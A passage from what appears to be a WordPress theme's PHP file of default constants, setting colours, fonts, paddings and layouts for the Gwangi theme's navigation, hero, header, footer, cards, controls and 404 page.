	define( 'GWANGI_BUTTON_BORDER_RADIUS', GWANGI_BORDER_RADIUS );
}

if ( ! defined( 'GWANGI_BUTTON_PADDING_Y' ) ) {
	define( 'GWANGI_BUTTON_PADDING_Y', .8 );
}

if ( ! defined( 'GWANGI_BUTTON_PADDING_X' ) ) {
	define( 'GWANGI_BUTTON_PADDING_X', 1.25 );
}

if ( ! defined( 'GWANGI_BUTTON_FONT_LETTER_SPACING' ) ) {
	define( 'GWANGI_BUTTON_FONT_LETTER_SPACING', '0' );
}

if ( ! defined( 'GWANGI_BUTTON_FONT_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_BUTTON_FONT_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_BUTTON_FONT_SIZE' ) ) {
	define( 'GWANGI_BUTTON_FONT_SIZE', '15px' );
}

if ( ! defined( 'GWANGI_BUTTON_FONT_VARIANT' ) ) {
	define( 'GWANGI_BUTTON_FONT_VARIANT', GWANGI_FONT_WEIGHT_BOLD );
}


/**
 * SECTIONS
 */

if ( ! defined( 'GWANGI_SECTION_PADDING_Y' ) ) {
	define( 'GWANGI_SECTION_PADDING_Y', 6 );
} // %
if ( ! defined( 'GWANGI_SECTION_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_SECTION_BACKGROUND_COLOR', GWANGI_GRAY_LIGHTEST );
}

if ( ! defined( 'GWANGI_SECTION_WIDGET_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_SECTION_WIDGET_BACKGROUND_COLOR', GWANGI_GRAY_LIGHTEST );
}


/**
 * NAVIGATION
 */

if ( ! defined( 'GWANGI_NAVIGATION_FONT_FAMILY' ) ) {
	define( 'GWANGI_NAVIGATION_FONT_FAMILY', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_NAVIGATION_FONT_WEIGHT' ) ) {
	define( 'GWANGI_NAVIGATION_FONT_WEIGHT', GWANGI_FONT_WEIGHT_BOLD );
}

if ( ! defined( 'GWANGI_NAVIGATION_FONT_SIZE' ) ) {
	define( 'GWANGI_NAVIGATION_FONT_SIZE', '1rem' );
}

if ( ! defined( 'GWANGI_NAVIGATION_LINE_HEIGHT' ) ) {
	define( 'GWANGI_NAVIGATION_LINE_HEIGHT', '1.25' );
}

if ( ! defined( 'GWANGI_NAVIGATION_LETTER_SPACING' ) ) {
	define( 'GWANGI_NAVIGATION_LETTER_SPACING', '0px' );
}

if ( ! defined( 'GWANGI_NAVIGATION_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_NAVIGATION_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_NAVIGATION_PADDING_Y' ) ) {
	define( 'GWANGI_NAVIGATION_PADDING_Y', 1.8 );
}

if ( ! defined( 'GWANGI_NAVIGATION_BACKGROUND' ) ) {
	define( 'GWANGI_NAVIGATION_BACKGROUND', '#ffffff' );
}

if ( ! defined( 'GWANGI_NAVIGATION_BORDER_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_BORDER_COLOR',  'rgba(237,237,237,.85)' );
}

if ( ! defined( 'GWANGI_NAVIGATION_BORDER_BOTTOM_WIDTH' ) ) {
	define( 'GWANGI_NAVIGATION_BORDER_BOTTOM_WIDTH', 1 );
}

if ( ! defined( 'GWANGI_NAVIGATION_BORDER_TOP_WIDTH' ) ) {
	define( 'GWANGI_NAVIGATION_BORDER_TOP_WIDTH', 0 );
}

if ( ! defined( 'GWANGI_NAVIGATION_ITEM_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_ITEM_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_NAVIGATION_ITEM_ACTIVE_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_ITEM_ACTIVE_BACKGROUND_COLOR',  'rgba(0,0,0,0)' );
}

if ( ! defined( 'GWANGI_NAVIGATION_ITEM_COLOR_ACTIVE' ) ) {
	define( 'GWANGI_NAVIGATION_ITEM_COLOR_ACTIVE', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_NAVIGATION_SUB_MENU_ITEM_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SUB_MENU_ITEM_BACKGROUND_COLOR', GWANGI_NAVIGATION_BACKGROUND );
}

if ( ! defined( 'GWANGI_NAVIGATION_SUB_MENU_ITEM_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SUB_MENU_ITEM_COLOR', GWANGI_NAVIGATION_ITEM_COLOR );
}

if ( ! defined( 'GWANGI_NAVIGATION_STICK_TO_TOP_BACKGROUND' ) ) {
	define( 'GWANGI_NAVIGATION_STICK_TO_TOP_BACKGROUND', 'rgba(255,255,255,0.94)' );
}

if ( ! defined( 'GWANGI_NAVIGATION_MOBILE_BACKGROUND' ) ) {
	define( 'GWANGI_NAVIGATION_MOBILE_BACKGROUND', GWANGI_NAVIGATION_BACKGROUND );
}

if ( ! defined( 'GWANGI_NAVIGATION_SEARCH_FORM_DISPLAYED' ) ) {
	define( 'GWANGI_NAVIGATION_SEARCH_FORM_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_NAVIGATION_LAYOUT' ) ) {
	define( 'GWANGI_NAVIGATION_LAYOUT', 'classic-center' );
}

if ( ! defined( 'GWANGI_NAVIGATION_POSITION' ) ) {
	define( 'GWANGI_NAVIGATION_POSITION', 'inside-top' );
}

if ( ! defined( 'GWANGI_NAVIGATION_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_NAVIGATION_CONTAINER_LAYOUT', 'fluid' );
}

if ( ! defined( 'GWANGI_NAVIGATION_STICK_TO_TOP' ) ) {
	define( 'GWANGI_NAVIGATION_STICK_TO_TOP', true );
}

if ( ! defined( 'GWANGI_NAVIGATION_SEARCH_FORM_PLACEHOLDER_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SEARCH_FORM_PLACEHOLDER_COLOR', 'rgba(255,255,255,0.8)' );
}

if ( ! defined( 'GWANGI_NAVIGATION_SEARCH_FORM_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SEARCH_FORM_BACKGROUND_COLOR', 'rgba(0, 0, 0, 0.03)' );
}

if ( ! defined( 'GWANGI_NAVIGATION_SEARCH_FORM_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SEARCH_FORM_COLOR', GWANGI_NAVIGATION_ITEM_COLOR );
}

if ( ! defined( 'GWANGI_NAVIGATION_SEARCH_FORM_ACTIVE_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SEARCH_FORM_ACTIVE_BACKGROUND_COLOR', 'rgba(113, 121, 142, 0.8)' );
}

if ( ! defined( 'GWANGI_NAVIGATION_SEARCH_FORM_ACTIVE_COLOR' ) ) {
	define( 'GWANGI_NAVIGATION_SEARCH_FORM_ACTIVE_COLOR', '#ffffff' );
}


/**
 * HERO
 */

if ( ! defined( 'GWANGI_HERO_TITLE' ) ) {
	define( 'GWANGI_HERO_TITLE', '<span>Reinvent </span><em><strong>Community</strong></em>' );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE' ) ) {
	define( 'GWANGI_HERO_SUBTITLE', 'We offer everyone the opportunity to communicate more easily, to live in the present moment and to discover the world while having fun.' );
}

if ( ! defined( 'GWANGI_HERO_TEXT' ) ) {
	define( 'GWANGI_HERO_TEXT', "You're Looking for...<br/>[bps_form form=204 template=members/bps-form-home]" );
}

if ( ! defined( 'GWANGI_HERO_TITLE_FONT_SIZE' ) ) {
	define( 'GWANGI_HERO_TITLE_FONT_SIZE', '3.3rem' );
}

if ( ! defined( 'GWANGI_HERO_LAYOUT' ) ) {
	define( 'GWANGI_HERO_LAYOUT', '6-6-cols-left-reverse' );
}

if ( ! defined( 'GWANGI_HERO_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_HERO_CONTAINER_LAYOUT', 'classic' );
}

if ( ! defined( 'GWANGI_HERO_FULL_SCREEN_DISPLAYED' ) ) {
	define( 'GWANGI_HERO_FULL_SCREEN_DISPLAYED', false );
}

if ( ! defined( 'GWANGI_HERO_TITLE_FONT_FAMILY' ) ) {
	define( 'GWANGI_HERO_TITLE_FONT_FAMILY', GWANGI_FONT_FAMILY_DISPLAY_HEADING );
}

if ( ! defined( 'GWANGI_HERO_TITLE_FONT_WEIGHT' ) ) {
	define( 'GWANGI_HERO_TITLE_FONT_WEIGHT', 400 );
}

if ( ! defined( 'GWANGI_HERO_TITLE_LINE_HEIGHT' ) ) {
	define( 'GWANGI_HERO_TITLE_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_HERO_TITLE_LETTER_SPACING' ) ) {
	define( 'GWANGI_HERO_TITLE_LETTER_SPACING', 0 );
}

if ( ! defined( 'GWANGI_HERO_TITLE_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_HERO_TITLE_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_HERO_TITLE_COLOR' ) ) {
	define( 'GWANGI_HERO_TITLE_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_HERO_TITLE_DISPLAYED' ) ) {
	define( 'GWANGI_HERO_TITLE_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_FONT_FAMILY' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_FONT_FAMILY', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_FONT_WEIGHT' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_FONT_WEIGHT', GWANGI_FONT_WEIGHT_NORMAL );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_FONT_SIZE' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_FONT_SIZE', '1.1rem' );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_LINE_HEIGHT' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_LINE_HEIGHT', GWANGI_LINE_HEIGHT_BASE );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_LETTER_SPACING' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_LETTER_SPACING', 0 );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_DISPLAYED' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_HERO_TEXT_FONT_FAMILY' ) ) {
	define( 'GWANGI_HERO_TEXT_FONT_FAMILY', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_HERO_TEXT_FONT_WEIGHT' ) ) {
	define( 'GWANGI_HERO_TEXT_FONT_WEIGHT', '600' );
}

if ( ! defined( 'GWANGI_HERO_TEXT_FONT_SIZE' ) ) {
	define( 'GWANGI_HERO_TEXT_FONT_SIZE', '.9em' );
}

if ( ! defined( 'GWANGI_HERO_TEXT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_HERO_TEXT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_BASE );
}

if ( ! defined( 'GWANGI_HERO_TEXT_LETTER_SPACING' ) ) {
	define( 'GWANGI_HERO_TEXT_LETTER_SPACING', 0 );
}

if ( ! defined( 'GWANGI_HERO_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_HERO_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_HERO_TEXT_DISPLAYED' ) ) {
	define( 'GWANGI_HERO_TEXT_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_DISPLAYED' ) ) {
	define( 'GWANGI_HERO_BUTTON_DISPLAYED', false );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND_GRADIENT_DISPLAYED' ) ) {
	define( 'GWANGI_HERO_BACKGROUND_GRADIENT_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND_GRADIENT_FIRST_COLOR' ) ) {
	define( 'GWANGI_HERO_BACKGROUND_GRADIENT_FIRST_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND_GRADIENT_SECOND_COLOR' ) ) {
	define( 'GWANGI_HERO_BACKGROUND_GRADIENT_SECOND_COLOR', 'rgba(36, 93, 198, 0)' );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND_GRADIENT_DIRECTION' ) ) {
	define( 'GWANGI_HERO_BACKGROUND_GRADIENT_DIRECTION', '-80deg' );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND_GRADIENT_POSITION' ) ) {
	define( 'GWANGI_HERO_BACKGROUND_GRADIENT_POSITION', '10' );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND' ) ) {
	define( 'GWANGI_HERO_BACKGROUND', 'rgba(0,0,0,0)' );
}

if ( ! defined( 'GWANGI_HERO_SUBTITLE_COLOR' ) ) {
	define( 'GWANGI_HERO_SUBTITLE_COLOR', 'rgba(255,255,255,0.85)' );
}

if ( ! defined( 'GWANGI_HERO_TEXT_COLOR' ) ) {
	define( 'GWANGI_HERO_TEXT_COLOR', 'rgba(255,255,255,0.85)' );
}

if ( ! defined( 'GWANGI_HERO_PADDING_Y' ) ) {
	define( 'GWANGI_HERO_PADDING_Y', 12 );
}

if ( ! defined( 'GWANGI_HERO_BACKGROUND_SECONDARY' ) ) {
	define( 'GWANGI_HERO_BACKGROUND_SECONDARY', 'rgba(255,255,255,0)' );
}

if ( ! defined( 'GWANGI_HERO_COLOR_SCHEME' ) ) {
	define( 'GWANGI_HERO_COLOR_SCHEME', 'light' );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_COLOR' ) ) {
	define( 'GWANGI_HERO_BUTTON_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_HERO_BUTTON_BACKGROUND_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_BORDER_COLOR' ) ) {
	define( 'GWANGI_HERO_BUTTON_BORDER_COLOR', GWANGI_HERO_BUTTON_BACKGROUND_COLOR );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_HOVER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_HERO_BUTTON_HOVER_BACKGROUND_COLOR', GWANGI_BRAND_SECONDARY_HOVER );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_HOVER_COLOR' ) ) {
	define( 'GWANGI_HERO_BUTTON_HOVER_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_HERO_BUTTON_HOVER_BORDER_COLOR' ) ) {
	define( 'GWANGI_HERO_BUTTON_HOVER_BORDER_COLOR', GWANGI_BRAND_SECONDARY_HOVER );
}


/**
 * HEADER
 */

if ( ! defined( 'GWANGI_HEADER_PADDING_Y' ) ) {
	define( 'GWANGI_HEADER_PADDING_Y', 6 );
}

if ( ! defined( 'GWANGI_BIG_HEADER_PADDING_Y' ) ) {
	define( 'GWANGI_BIG_HEADER_PADDING_Y', 13 );
}

if ( ! defined( 'GWANGI_HEADER_BACKGROUND' ) ) {
	define( 'GWANGI_HEADER_BACKGROUND', 'rgba(61, 64, 74, 0.6)' );
}

if ( ! defined( 'GWANGI_CUSTOM_HEADER_LAYOUT' ) ) {
	define( 'GWANGI_CUSTOM_HEADER_LAYOUT', '12-cols-center' );
}

if ( ! defined( 'GWANGI_CUSTOM_HEADER_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_CUSTOM_HEADER_CONTAINER_LAYOUT', 'narrow' );
}

if ( ! defined( 'GWANGI_CUSTOM_HEADER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_CUSTOM_HEADER_BACKGROUND_COLOR', GWANGI_HEADER_BACKGROUND );
}


/**
 * CONTENT
 */

if ( ! defined( 'GWANGI_CONTENT_PADDING_Y' ) ) {
	define( 'GWANGI_CONTENT_PADDING_Y', 4 );
}

if ( ! defined( 'GWANGI_CONTENT_BACKGROUND' ) ) {
	define( 'GWANGI_CONTENT_BACKGROUND', GWANGI_GRAY_LIGHTEST );
}

if ( ! defined( 'GWANGI_WRAPPER_LAYOUT' ) ) {
	define( 'GWANGI_WRAPPER_LAYOUT', 'classic' );
}


/**
 * PREFOOTER
 */

if ( ! defined( 'GWANGI_PREFOOTER_BACKGROUND_IMAGE' ) ) {
	define( 'GWANGI_PREFOOTER_BACKGROUND_IMAGE', '' );
}

if ( ! defined( 'GWANGI_PREFOOTER_LAYOUT' ) ) {
	define( 'GWANGI_PREFOOTER_LAYOUT', '3-3-3-3-cols-left' );
}

if ( ! defined( 'GWANGI_PREFOOTER_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_PREFOOTER_CONTAINER_LAYOUT', 'classic' );
}

if ( ! defined( 'GWANGI_PREFOOTER_PADDING_Y' ) ) {
	define( 'GWANGI_PREFOOTER_PADDING_Y', 4 );
}

if ( ! defined( 'GWANGI_PREFOOTER_MOBILE_DISPLAYED' ) ) {
	define( 'GWANGI_PREFOOTER_MOBILE_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_PREFOOTER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_BACKGROUND_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_PREFOOTER_HEADING_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_HEADING_COLOR', 'rgba(237,237,237,.6)' );
}

if ( ! defined( 'GWANGI_PREFOOTER_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_COLOR', GWANGI_GRAY_LIGHTEST );
}

if ( ! defined( 'GWANGI_PREFOOTER_LINK_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_LINK_COLOR', GWANGI_GRAY_LIGHTEST );
}

if ( ! defined( 'GWANGI_PREFOOTER_LINK_HOVER_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_LINK_HOVER_COLOR', GWANGI_GRAY_LIGHT );
}

if ( ! defined( 'GWANGI_PREFOOTER_BORDER_TOP_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_BORDER_TOP_COLOR', '#35373E' );
}

if ( ! defined( 'GWANGI_PREFOOTER_BORDER_TOP_WIDTH' ) ) {
	define( 'GWANGI_PREFOOTER_BORDER_TOP_WIDTH', GWANGI_BORDER_WIDTH );
}

if ( ! defined( 'GWANGI_PREFOOTER_BORDER_BOTTOM_COLOR' ) ) {
	define( 'GWANGI_PREFOOTER_BORDER_BOTTOM_COLOR', '#35373E' );
}

if ( ! defined( 'GWANGI_PREFOOTER_BORDER_BOTTOM_WIDTH' ) ) {
	define( 'GWANGI_PREFOOTER_BORDER_BOTTOM_WIDTH', 0 );
}


/**
 * FOOTER
 */

if ( ! defined( 'GWANGI_FOOTER_BACKGROUND_IMAGE' ) ) {
	define( 'GWANGI_FOOTER_BACKGROUND_IMAGE', '' );
}

if ( ! defined( 'GWANGI_FOOTER_LAYOUT' ) ) {
	define( 'GWANGI_FOOTER_LAYOUT', '3-3-3-3-cols-left' );
}

if ( ! defined( 'GWANGI_FOOTER_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_FOOTER_CONTAINER_LAYOUT', 'classic' );
}

if ( ! defined( 'GWANGI_FOOTER_PADDING_Y' ) ) {
	define( 'GWANGI_FOOTER_PADDING_Y', 2 );
}

if ( ! defined( 'GWANGI_FOOTER_MOBILE_DISPLAYED' ) ) {
	define( 'GWANGI_FOOTER_MOBILE_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_FOOTER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_FOOTER_BACKGROUND_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_FOOTER_HEADING_COLOR' ) ) {
	define( 'GWANGI_FOOTER_HEADING_COLOR', '#FFFFFF' );
}

if ( ! defined( 'GWANGI_FOOTER_COLOR' ) ) {
	define( 'GWANGI_FOOTER_COLOR', GWANGI_GRAY_LIGHTER );
}

if ( ! defined( 'GWANGI_FOOTER_LINK_COLOR' ) ) {
	define( 'GWANGI_FOOTER_LINK_COLOR', GWANGI_GRAY_LIGHTER );
}

if ( ! defined( 'GWANGI_FOOTER_LINK_HOVER_COLOR' ) ) {
	define( 'GWANGI_FOOTER_LINK_HOVER_COLOR', '#FFFFFF' );
}

if ( ! defined( 'GWANGI_FOOTER_BORDER_TOP_WIDTH' ) ) {
	define( 'GWANGI_FOOTER_BORDER_TOP_WIDTH', 1 );
}

if ( ! defined( 'GWANGI_FOOTER_BORDER_TOP_COLOR' ) ) {
	define( 'GWANGI_FOOTER_BORDER_TOP_COLOR', '#292e2f' );
}

if ( ! defined( 'GWANGI_FOOTER_BORDER_BOTTOM_WIDTH' ) ) {
	define( 'GWANGI_FOOTER_BORDER_BOTTOM_WIDTH', 0 );
}

if ( ! defined( 'GWANGI_FOOTER_BORDER_BOTTOM_COLOR' ) ) {
	define( 'GWANGI_FOOTER_BORDER_BOTTOM_COLOR', 'rgba(255,255,255,0)' );
}


/**
 * ARCHIVES
 */

if ( ! defined( 'GWANGI_CARD_BACKGROUND' ) ) {
	define( 'GWANGI_CARD_BACKGROUND', '#ffffff' );
}

if ( ! defined( 'GWANGI_CARD_PADDING' ) ) {
	define( 'GWANGI_CARD_PADDING', 30 );
}

if ( ! defined( 'GWANGI_CARD_MARGIN' ) ) {
	define( 'GWANGI_CARD_MARGIN', 10 );
}

if ( ! defined( 'GWANGI_CARD_BORDER_RADIUS' ) ) {
	define( 'GWANGI_CARD_BORDER_RADIUS', GWANGI_BORDER_RADIUS );
}

if ( ! defined( 'GWANGI_CARD_BORDER_WIDTH' ) ) {
	define( 'GWANGI_CARD_BORDER_WIDTH', GWANGI_BORDER_WIDTH );
}

if ( ! defined( 'GWANGI_CARD_BORDER_COLOR' ) ) {
	define( 'GWANGI_CARD_BORDER_COLOR', GWANGI_GRAY_LIGHTER );
}

if ( ! defined( 'GWANGI_BOX_SHADOW_X_OFFSET' ) ) {
	define( 'GWANGI_BOX_SHADOW_X_OFFSET', 0 );
}

if ( ! defined( 'GWANGI_BOX_SHADOW_Y_OFFSET' ) ) {
	define( 'GWANGI_BOX_SHADOW_Y_OFFSET', 0 );
}

if ( ! defined( 'GWANGI_BOX_SHADOW_BLUR_RADIUS' ) ) {
	define( 'GWANGI_BOX_SHADOW_BLUR_RADIUS', 15 );
}

if ( ! defined( 'GWANGI_BOX_SHADOW_SPREAD_RADIUS' ) ) {
	define( 'GWANGI_BOX_SHADOW_SPREAD_RADIUS', 0 );
}

if ( ! defined( 'GWANGI_BOX_SHADOW_COLOR' ) ) {
	define( 'GWANGI_BOX_SHADOW_COLOR', 'rgba(0, 0, 0, 0.04)' );
}

if ( ! defined( 'GWANGI_CARD_COLOR' ) ) {
	define( 'GWANGI_CARD_COLOR', GWANGI_GRAY_LIGHT );
}

if ( ! defined( 'GWANGI_CARD_TITLE_COLOR' ) ) {
	define( 'GWANGI_CARD_TITLE_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_CARD_LINK_COLOR' ) ) {
	define( 'GWANGI_CARD_LINK_COLOR', GWANGI_GRAY_LIGHT );
}

if ( ! defined( 'GWANGI_CARD_LINK_HOVER_COLOR' ) ) {
	define( 'GWANGI_CARD_LINK_HOVER_COLOR', GWANGI_LINK_HOVER_COLOR );
}

if ( ! defined( 'GWANGI_ARCHIVE_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_LAYOUT', '12-cols-left' );
}

if ( ! defined( 'GWANGI_ARCHIVE_POSTS_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_POSTS_LAYOUT', '4-4-4-cols-classic' );
}

if ( ! defined( 'GWANGI_ARCHIVE_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_CONTAINER_LAYOUT', 'classic' );
}

if ( ! defined( 'GWANGI_ARCHIVE_POSTS_HEIGHT_EQUALIZED' ) ) {
	define( 'GWANGI_ARCHIVE_POSTS_HEIGHT_EQUALIZED', false );
}

if ( ! defined( 'GWANGI_ARCHIVE_CUSTOM_HEADER_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_CUSTOM_HEADER_LAYOUT', '12-cols-center' );
}


/**
 * CONTROLS
 */

if ( ! defined( 'GWANGI_CONTROL_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_CONTROL_BACKGROUND_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_CONTROL_COLOR' ) ) {
	define( 'GWANGI_CONTROL_COLOR', GWANGI_GRAY );
}

if ( ! defined( 'GWANGI_CONTROL_PLACEHOLDER_COLOR' ) ) {
	define( 'GWANGI_CONTROL_PLACEHOLDER_COLOR', GWANGI_GRAY_LIGHT );
}

if ( ! defined( 'GWANGI_CONTROL_BORDER_COLOR' ) ) {
	define( 'GWANGI_CONTROL_BORDER_COLOR', 'rgba(0,0,0,.15)' );
}

if ( ! defined( 'GWANGI_CONTROL_FOCUS_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_CONTROL_FOCUS_BACKGROUND_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_CONTROL_FOCUS_COLOR' ) ) {
	define( 'GWANGI_CONTROL_FOCUS_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_CONTROL_FOCUS_BORDER_COLOR' ) ) {
	define( 'GWANGI_CONTROL_FOCUS_BORDER_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_CONTROL_BORDER_WIDTH' ) ) {
	define( 'GWANGI_CONTROL_BORDER_WIDTH', GWANGI_BUTTON_BORDER_WIDTH );
}

if ( ! defined( 'GWANGI_CONTROL_BORDER_RADIUS' ) ) {
	define( 'GWANGI_CONTROL_BORDER_RADIUS', GWANGI_BUTTON_BORDER_RADIUS );
}


/**
 * PAGINATION
 */

if ( ! defined( 'GWANGI_PAGINATION_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_PAGINATION_BACKGROUND_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_PAGINATION_HOVER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_PAGINATION_HOVER_BACKGROUND_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_PAGINATION_COLOR' ) ) {
	define( 'GWANGI_PAGINATION_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_PAGINATION_HOVER_COLOR' ) ) {
	define( 'GWANGI_PAGINATION_HOVER_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_PAGINATION_BORDER_COLOR' ) ) {
	define( 'GWANGI_PAGINATION_BORDER_COLOR', GWANGI_GRAY_LIGHTER );
}

if ( ! defined( 'GWANGI_PAGINATION_HOVER_BORDER_COLOR' ) ) {
	define( 'GWANGI_PAGINATION_HOVER_BORDER_COLOR', GWANGI_GRAY_DARK );
}


/**
 * 404
 */

if ( ! defined( 'GWANGI_404_PADDING_Y' ) ) {
	define( 'GWANGI_404_PADDING_Y', 0 );
}

if ( ! defined( 'GWANGI_404_FULL_SCREEN_DISPLAYED' ) ) {
	define( 'GWANGI_404_FULL_SCREEN_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_404_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_404_BACKGROUND_COLOR', GWANGI_GRAY_LIGHTEST );
}

if ( ! defined( 'GWANGI_404_THUMBNAIL' ) ) {
	define( 'GWANGI_404_THUMBNAIL', get_stylesheet_directory_uri() . '/assets/images/pages/page-404.jpg' );
}

if ( ! defined( 'GWANGI_404_TITLE' ) ) {
	define( 'GWANGI_404_TITLE', esc_html__( '404', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_404_TITLE_COLOR' ) ) {
	define( 'GWANGI_404_TITLE_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_404_TITLE_FORMAT' ) ) {
	define( 'GWANGI_404_TITLE_FORMAT', 'display-1' );
}

if ( ! defined( 'GWANGI_404_SUBTITLE' ) ) {
	define( 'GWANGI_404_SUBTITLE', esc_html__( 'Page not found.', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_404_SUBTITLE_COLOR' ) ) {
	define( 'GWANGI_404_SUBTITLE_COLOR', GWANGI_GRAY );
}

if ( ! defined( 'GWANGI_404_TEXT' ) ) {
	define( 'GWANGI_404_TEXT', esc_html__( 'It looks like nothing was found at this location. Maybe try one of the links below or a search?', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_404_TEXT_COLOR' ) ) {
	define( 'GWANGI_404_TEXT_COLOR', GWANGI_GRAY );
}

if ( ! defined( 'GWANGI_404_BUTTON_DISPLAYED' ) ) {
	define( 'GWANGI_404_BUTTON_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_404_BUTTON_COLOR' ) ) {
	define( 'GWANGI_404_BUTTON_COLOR', GWANGI_HERO_BUTTON_COLOR );
}

if ( ! defined( 'GWANGI_404_BUTTON_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_404_BUTTON_BACKGROUND_COLOR', GWANGI_HERO_BUTTON_BACKGROUND_COLOR );
}

if ( ! defined( 'GWANGI_404_BUTTON_BORDER_COLOR' ) ) {
	define( 'GWANGI_404_BUTTON_BORDER_COLOR', GWANGI_HERO_BUTTON_BORDER_COLOR );
}

if ( ! defined( 'GWANGI_404_BUTTON_HOVER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_404_BUTTON_HOVER_BACKGROUND_COLOR', GWANGI_HERO_BUTTON_HOVER_BACKGROUND_COLOR );
}

